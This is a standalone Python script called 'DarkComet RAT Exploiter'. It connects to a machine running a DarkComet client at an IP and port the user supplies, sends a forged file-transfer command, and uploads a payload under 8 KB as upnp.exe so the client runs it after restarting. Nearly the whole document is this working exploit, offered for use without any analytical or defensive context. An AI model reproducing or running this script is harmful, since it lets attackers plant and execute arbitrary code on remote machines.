# DarkComet RAT - Exploiter
# written by Slayer616
# Thanks to: Opcodez, Zacherl, steve1020, 2sly, Protocol, all other friends/coders/supporters
import socket
import os
print("-----------------------------------------------------------")
print("DarkComet RAT Exploiter")
print("Coded by Slayer616")
print("-----------------------------------------------------------")
sIP = input("Type in IP of the Remote PC: ")
sPort = input("Type in Port of the Remote PC: ")
sFile = input("Type in full path to Payload: ")
if os.path.exists(sFile):
    bLen= os.path.getsize(sFile)
    if bLen < 8096:
        if sPort.isdigit():
            print("Connecting to %s on Port %s" % (sIP,sPort))
            sSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sSock.connect((sIP, int(sPort)))
                print("Connected to Remote PC!")
                sData = str(sSock.recv(1024),'ASCII')
                if sData == "IDTYPE":
                    print("Valid Client! Now sending request!")
                    sSock.send(bytes("TRANSFERupnp.exe|DLFILE|562|7","ASCII"))
                    sSock.recv(1024)
                    sData = "Size:%s" % (str(bLen))
                    sSock.send(bytes(sData,"ASCII"))
                    sSock.recv(1024)
                    f = open(sFile,"rb")
                    sData = f.read()
                    f.close()
                    sSock.send(sData)
                    sSock.close()
                    print("Finished! Now wait until Client.exe restarts!")
                else:
                    print("This is not a valid DarkComet Client!")
            except:
               print("Couldnt connect to Remote PC!")
        else:
            print("Port is not a valid Integer!")
    else:
        print("Payload is too great! Use one with less then 8Kbyte!")
else:
    print("File not found!")
